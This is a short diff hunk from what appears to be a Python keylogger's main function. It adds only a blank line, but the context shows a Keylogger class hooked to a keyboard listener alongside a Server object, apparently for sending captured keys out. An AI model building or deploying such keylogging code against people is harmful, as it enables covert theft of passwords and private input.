@@ -8,6 +8,7 @@ def main():
     lock = Lock()
     logger = Keylogger(lock)
     myServer = Server(lock)
+
     with Listener(on_press = logger.on_press, on_release = logger.on_release) as listener:
         listener.join()
 
